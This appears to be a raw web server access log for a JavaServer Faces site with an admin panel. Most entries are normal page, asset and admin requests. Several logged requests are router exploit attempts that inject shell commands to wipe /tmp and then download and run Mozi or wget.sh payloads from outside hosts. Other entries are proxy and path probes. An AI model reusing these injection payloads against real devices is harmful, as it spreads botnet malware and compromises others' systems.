44.220.188.134 - - [15/Jul/2024:00:42:01 +0330] "GET / HTTP/1.1" 200 6040
23.95.200.178 - - [15/Jul/2024:01:13:04 +0330] "GET / HTTP/1.1" 200 6041
87.121.69.27 - - [15/Jul/2024:01:19:01 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
92.38.44.244 - - [15/Jul/2024:02:31:09 +0330] "GET / HTTP/1.1" 200 6040
87.121.69.27 - - [15/Jul/2024:02:42:03 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
223.70.246.13 - - [15/Jul/2024:03:23:53 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 400 778
200.127.241.92 - - [15/Jul/2024:03:30:34 +0330] "GET / HTTP/1.0" 200 6039
44.195.32.105 - - [15/Jul/2024:05:11:13 +0330] "CONNECT www.google.com:443 HTTP/1.1" 400 811
58.220.109.154 - - [15/Jul/2024:05:12:28 +0330] "GET /geoserver/web/ HTTP/1.1" 404 789
42.224.133.102 - - [15/Jul/2024:05:19:32 +0330] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://42.224.133.102:41043/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 776
74.50.91.51 - - [15/Jul/2024:05:37:21 +0330] "GET / HTTP/1.1" 200 6039
185.191.126.213 - - [15/Jul/2024:05:59:28 +0330] "GET / HTTP/1.1" 200 6041
44.195.32.105 - - [15/Jul/2024:06:12:48 +0330] "CONNECT www.google.com:443 HTTP/1.1" 400 811
94.156.10.163 - - [15/Jul/2024:06:29:43 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
87.121.69.27 - - [15/Jul/2024:06:36:38 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
190.246.165.66 - - [15/Jul/2024:07:54:14 +0330] "GET / HTTP/1.1" 200 6038
87.121.69.27 - - [15/Jul/2024:08:08:32 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
194.59.31.99 - - [15/Jul/2024:08:44:00 +0330] "CONNECT api.ipify.org:443 HTTP/1.1" 400 811
94.156.10.163 - - [15/Jul/2024:09:44:01 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
87.9.160.68 - - [15/Jul/2024:09:48:22 +0330] "GET / HTTP/1.0" 200 6039
87.121.69.27 - - [15/Jul/2024:09:59:20 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
80.75.212.75 - - [15/Jul/2024:10:08:27 +0330] "CONNECT www.google.com:443 HTTP/1.1" 400 811
80.75.212.75 - - [15/Jul/2024:10:08:27 +0330] "-" 400 1965
80.75.212.75 - - [15/Jul/2024:10:08:27 +0330] "-" 400 2013
45.148.10.202 - - [15/Jul/2024:10:27:17 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60for+proc_dir+in+%2Fproc%2F%5B0-9%5D%2A%3B+do+pid%3D%24%7Bproc_dir%23%23%2A%2F%7D%3B+buffer%3D%24%28cat+%22%2Fproc%2F%24pid%2Fmaps%22%29%3B+if+%5B+%22%24%7B%23buffer%7D%22+-gt+1+%5D%3B+then+if+%5B+%22%24%7Bbuffer%23%2A%22%2Flib%2F%22%7D%22+%3D+%22%24buffer%22+%5D+%26%26+%5B+%22%24%7Bbuffer%23%2A%22telnetdbot%22%7D%22+%3D+%22%24buffer%22+%5D%3B+then+kill+-9+%22%24pid%22%3B+fi%3B+fi%3B+done%60) HTTP/1.1" 404 805
45.148.10.202 - - [15/Jul/2024:10:27:17 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+wget.sh%3B+wget+http%3A%2F%2F87.121.112.42%2Fwget.sh%3B+chmod+777+wget.sh%3B+.%2Fwget.sh+tplink%3B+rm+-rf+wget.sh%60) HTTP/1.1" 404 805
94.156.10.163 - - [15/Jul/2024:10:29:32 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
178.251.137.5 - - [15/Jul/2024:10:38:27 +0330] "GET / HTTP/1.1" 200 6039
165.154.118.215 - - [15/Jul/2024:10:45:27 +0330] "-" 400 2215
165.154.118.215 - - [15/Jul/2024:10:45:38 +0330] "GET / HTTP/1.1" 200 6039
165.154.118.215 - - [15/Jul/2024:10:45:57 +0330] "GET /favicon.ico HTTP/1.1" 404 743
165.154.118.215 - - [15/Jul/2024:10:45:58 +0330] "GET /robots.txt HTTP/1.1" 404 742
165.154.118.215 - - [15/Jul/2024:10:45:58 +0330] "GET /sitemap.xml HTTP/1.1" 404 743
165.154.118.215 - - [15/Jul/2024:10:45:59 +0330] "GET /javax.faces.resource/unload.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE?ln=omnifaces&v=3.2 HTTP/1.1" 200 2565
165.154.118.215 - - [15/Jul/2024:10:45:59 +0330] "GET /javax.faces.resource/js/login.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE HTTP/1.1" 200 40319
165.154.118.215 - - [15/Jul/2024:10:45:59 +0330] "GET /javax.faces.resource/js/select2.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE HTTP/1.1" 200 169126
165.154.118.215 - - [15/Jul/2024:10:46:00 +0330] "GET /javax.faces.resource/core.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE?ln=primefaces&v=8.0 HTTP/1.1" 200 43146
165.154.118.215 - - [15/Jul/2024:10:46:00 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE?ln=primefaces&v=8.0 HTTP/1.1" 200 267621
165.154.118.215 - - [15/Jul/2024:10:46:00 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE?ln=primefaces&v=8.0 HTTP/1.1" 200 88237
165.154.118.215 - - [15/Jul/2024:10:46:00 +0330] "GET /javax.faces.resource/components.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE?ln=primefaces&v=8.0 HTTP/1.1" 200 435082
165.154.118.215 - - [15/Jul/2024:10:46:00 +0330] "GET /javax.faces.resource/js/tilt.jquery.min.js.xhtml;jsessionid=C986900522CE5A80CB1D09CE59142DAE HTTP/1.1" 200 5640
165.154.118.215 - - [15/Jul/2024:10:46:01 +0330] "GET /config.json HTTP/1.1" 404 743
181.192.21.168 - - [15/Jul/2024:10:59:02 +0330] "GET / HTTP/1.1" 200 6040
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET / HTTP/1.1" 200 6040
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/css/panel-rtl.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 655
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 53430
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/css/login.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 9656
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/css/hamburgers.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 24721
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/css/select2.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 18114
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/css/animate.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 78897
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/components.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB?ln=primefaces&v=8.0 HTTP/1.1" 200 96157
94.177.73.70 - - [15/Jul/2024:11:20:09 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB?ln=primefaces&v=8.0 HTTP/1.1" 200 88237
94.177.73.70 - - [15/Jul/2024:11:20:10 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB?ln=primefaces&v=8.0 HTTP/1.1" 200 267621
94.177.73.70 - - [15/Jul/2024:11:20:10 +0330] "GET /javax.faces.resource/js/select2.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 169126
94.177.73.70 - - [15/Jul/2024:11:20:10 +0330] "GET /javax.faces.resource/css/admin.css.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 264353
94.177.73.70 - - [15/Jul/2024:11:20:10 +0330] "GET /javax.faces.resource/components.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB?ln=primefaces&v=8.0 HTTP/1.1" 200 435082
94.177.73.70 - - [15/Jul/2024:11:20:10 +0330] "GET /javax.faces.resource/js/tilt.jquery.min.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 5640
94.177.73.70 - - [15/Jul/2024:11:20:11 +0330] "GET /javax.faces.resource/js/login.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 40319
94.177.73.70 - - [15/Jul/2024:11:20:11 +0330] "GET /javax.faces.resource/unload.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB?ln=omnifaces&v=3.2 HTTP/1.1" 200 2565
94.177.73.70 - - [15/Jul/2024:11:20:11 +0330] "GET /javax.faces.resource/core.js.xhtml;jsessionid=9F8E405D60967C05AA46D11F0113F8AB?ln=primefaces&v=8.0 HTTP/1.1" 200 43146
94.177.73.70 - - [15/Jul/2024:11:20:12 +0330] "GET /favicon.ico HTTP/1.1" 404 778
94.177.73.70 - - [15/Jul/2024:11:20:15 +0330] "POST /;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 127
94.177.73.70 - - [15/Jul/2024:11:20:15 +0330] "POST /;jsessionid=9F8E405D60967C05AA46D11F0113F8AB HTTP/1.1" 200 -
94.177.73.70 - - [15/Jul/2024:11:20:15 +0330] "GET /admin/ HTTP/1.1" 200 26875
94.177.73.70 - - [15/Jul/2024:11:20:36 +0330] "GET /admin/?page=11 HTTP/1.1" 200 66222
94.177.73.70 - - [15/Jul/2024:11:20:39 +0330] "GET /admin/?page=21 HTTP/1.1" 200 94446
94.177.73.70 - - [15/Jul/2024:11:20:43 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26463
94.177.73.70 - - [15/Jul/2024:11:20:54 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:21:02 +0330] "POST /admin/?page=21 HTTP/1.1" 200 2970
94.177.73.70 - - [15/Jul/2024:11:21:23 +0330] "POST /admin/?page=11 HTTP/1.1" 200 23568
94.177.73.70 - - [15/Jul/2024:11:21:23 +0330] "POST /admin/?page=11 HTTP/1.1" 200 23582
94.177.73.70 - - [15/Jul/2024:11:21:24 +0330] "POST /admin/?page=11 HTTP/1.1" 200 23325
94.177.73.70 - - [15/Jul/2024:11:21:27 +0330] "POST /admin/?page=11 HTTP/1.1" 200 16493
94.177.73.70 - - [15/Jul/2024:11:21:28 +0330] "POST /admin/?page=11 HTTP/1.1" 200 4959
94.177.73.70 - - [15/Jul/2024:11:21:28 +0330] "POST /admin/?page=11 HTTP/1.1" 200 2646
94.177.73.70 - - [15/Jul/2024:11:21:35 +0330] "GET /admin/?page=12&item=669179318f3c7666a6886e18 HTTP/1.1" 200 74683
94.177.73.70 - - [15/Jul/2024:11:21:52 +0330] "POST /admin/?page=12&item=669179318f3c7666a6886e18 HTTP/1.1" 200 -
94.177.73.70 - - [15/Jul/2024:11:21:52 +0330] "GET /admin/?page=34&item=669411f25350cd6d283d1517 HTTP/1.1" 200 32373
94.177.73.70 - - [15/Jul/2024:11:21:52 +0330] "GET /resources/images/background/chat.png HTTP/1.1" 404 815
94.177.73.70 - - [15/Jul/2024:11:21:54 +0330] "POST /admin/?page=34&item=669411f25350cd6d283d1517 HTTP/1.1" 200 -
94.177.73.70 - - [15/Jul/2024:11:27:01 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:27:04 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:27:09 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:27:09 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:27:12 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:27:16 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26557
94.177.73.70 - - [15/Jul/2024:11:27:17 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26557
94.177.73.70 - - [15/Jul/2024:11:27:18 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26538
94.177.73.70 - - [15/Jul/2024:11:27:19 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26465
94.177.73.70 - - [15/Jul/2024:11:27:20 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26465
94.177.73.70 - - [15/Jul/2024:11:27:21 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:27:24 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26463
94.177.73.70 - - [15/Jul/2024:11:28:04 +0330] "POST /admin/?page=21 HTTP/1.1" 200 2970
94.177.73.70 - - [15/Jul/2024:11:30:52 +0330] "POST /admin/?page=21 HTTP/1.1" 200 427
94.177.73.70 - - [15/Jul/2024:11:30:55 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26533
94.177.73.70 - - [15/Jul/2024:11:30:56 +0330] "POST /admin/?page=21 HTTP/1.1" 200 26542
94.177.73.70 - - [15/Jul/2024:11:30:57 +0330] "POST /admin/?page=21 HTTP/1.1" 200 13386
94.177.73.70 - - [15/Jul/2024:11:30:58 +0330] "POST /admin/?page=21 HTTP/1.1" 200 5559
94.177.73.70 - - [15/Jul/2024:11:30:59 +0330] "POST /admin/?page=21 HTTP/1.1" 200 2961
94.177.73.70 - - [15/Jul/2024:11:33:24 +0330] "POST /admin/?page=21 HTTP/1.1" 200 2913
103.158.96.81 - - [15/Jul/2024:12:01:59 +0330] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://172.36.0.117:34614/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 776
94.177.73.70 - - [15/Jul/2024:12:02:33 +0330] "POST /admin/?page=12&item=669179318f3c7666a6886e18 HTTP/1.1" 301 -
94.177.73.70 - - [15/Jul/2024:12:02:33 +0330] "GET /admin/?page=12&item=669179318f3c7666a6886e18 HTTP/1.1" 302 -
94.177.73.70 - - [15/Jul/2024:12:02:33 +0330] "GET / HTTP/1.1" 200 5292
87.121.69.27 - - [15/Jul/2024:12:21:59 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
14.207.75.241 - - [15/Jul/2024:12:26:24 +0330] "GET / HTTP/1.0" 200 6039
178.215.236.52 - - [15/Jul/2024:12:31:56 +0330] "CONNECT 45.61.137.126:7227 HTTP/1.1" 400 811
94.156.10.163 - - [15/Jul/2024:13:50:54 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 404 797
84.54.51.37 - - [15/Jul/2024:13:59:53 +0330] "GET null HTTP/1.1" 400 2443
194.59.31.99 - - [15/Jul/2024:14:09:15 +0330] "CONNECT api6.ipify.org:443 HTTP/1.1" 400 811
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /admin/?page=33 HTTP/1.1" 302 -
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET / HTTP/1.1" 200 5292
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /javax.faces.resource/theme.css.xhtml?ln=primefaces-aristo HTTP/1.1" 200 24975
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /javax.faces.resource/css/panel-rtl.css.xhtml HTTP/1.1" 200 655
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /javax.faces.resource/css/login.css.xhtml HTTP/1.1" 200 9656
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /javax.faces.resource/css/hamburgers.css.xhtml HTTP/1.1" 200 24721
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /javax.faces.resource/css/theme/teanow-prime-1/theme.css.xhtml HTTP/1.1" 200 53430
94.177.73.70 - - [15/Jul/2024:14:52:55 +0330] "GET /javax.faces.resource/css/select2.css.xhtml HTTP/1.1" 200 18114
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/components.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 96157
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/css/animate.css.xhtml HTTP/1.1" 200 78897
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/jquery/jquery.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 88237
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/core.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 43146
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/jquery/jquery-plugins.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 267621
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/js/tilt.jquery.min.js.xhtml HTTP/1.1" 200 5640
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/js/login.js.xhtml HTTP/1.1" 200 40319
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/js/select2.js.xhtml HTTP/1.1" 200 169126
94.177.73.70 - - [15/Jul/2024:14:52:56 +0330] "GET /javax.faces.resource/unload.js.xhtml?ln=omnifaces&v=3.2 HTTP/1.1" 200 2565
94.177.73.70 - - [15/Jul/2024:14:52:57 +0330] "GET /javax.faces.resource/css/admin.css.xhtml HTTP/1.1" 200 264353
94.177.73.70 - - [15/Jul/2024:14:52:57 +0330] "GET /resources/images/logo/logo1.png HTTP/1.1" 200 12732
94.177.73.70 - - [15/Jul/2024:14:52:57 +0330] "GET /javax.faces.resource/font-awesome/css/fontawesome-all.css.xhtml?ln=icons HTTP/1.1" 200 49130
94.177.73.70 - - [15/Jul/2024:14:52:57 +0330] "GET /javax.faces.resource/themify-icons/themify-icons.css.xhtml?ln=icons HTTP/1.1" 200 17535
94.177.73.70 - - [15/Jul/2024:14:52:57 +0330] "GET /javax.faces.resource/simple-line-icons/css/simple-line-icons.css.xhtml?ln=icons HTTP/1.1" 200 13067
94.177.73.70 - - [15/Jul/2024:14:52:58 +0330] "GET /javax.faces.resource/components.js.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 435082
94.177.73.70 - - [15/Jul/2024:14:52:58 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebregularfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 33629
94.177.73.70 - - [15/Jul/2024:14:52:58 +0330] "GET / HTTP/1.1" 200 5290
94.177.73.70 - - [15/Jul/2024:14:52:58 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-solid-900.woff2.xhtml?ln=icons HTTP/1.1" 200 44056
94.177.73.70 - - [15/Jul/2024:14:52:59 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 33625
94.177.73.70 - - [15/Jul/2024:14:52:59 +0330] "GET /javax.faces.resource/font-awesome/webfonts/fa-regular-400.woff2.xhtml?ln=icons HTTP/1.1" 200 12244
94.177.73.70 - - [15/Jul/2024:14:53:01 +0330] "GET /favicon.ico HTTP/1.1" 404 778
94.177.73.70 - - [15/Jul/2024:14:53:09 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebmediumfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 34669
94.177.73.70 - - [15/Jul/2024:14:53:09 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanweblightfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 33985
94.177.73.70 - - [15/Jul/2024:14:53:09 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebthinfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 34321
94.177.73.70 - - [15/Jul/2024:14:53:09 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebextraboldfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 32872
94.177.73.70 - - [15/Jul/2024:14:53:09 +0330] "GET /javax.faces.resource/IranYekan/Farsi_numerals/WebFonts/fonts/woff/iranyekanwebblackfanum.woff.xhtml?ln=fonts HTTP/1.1" 200 33161
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "POST / HTTP/1.1" 200 127
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "GET /admin/index HTTP/1.1" 301 -
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "GET /admin/ HTTP/1.1" 200 26876
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "GET /javax.faces.resource/extra-libs/c3/c3.min.css.xhtml HTTP/1.1" 200 2161
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "GET /javax.faces.resource/extra-libs/jvector/jquery-jvectormap-2.0.2.css.xhtml HTTP/1.1" 200 6707
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "GET /javax.faces.resource/js/ktskey.js.xhtml HTTP/1.1" 200 9178
94.177.73.70 - - [15/Jul/2024:14:53:11 +0330] "GET /javax.faces.resource/primeicons/primeicons.css.xhtml?ln=primefaces&v=8.0 HTTP/1.1" 200 8012
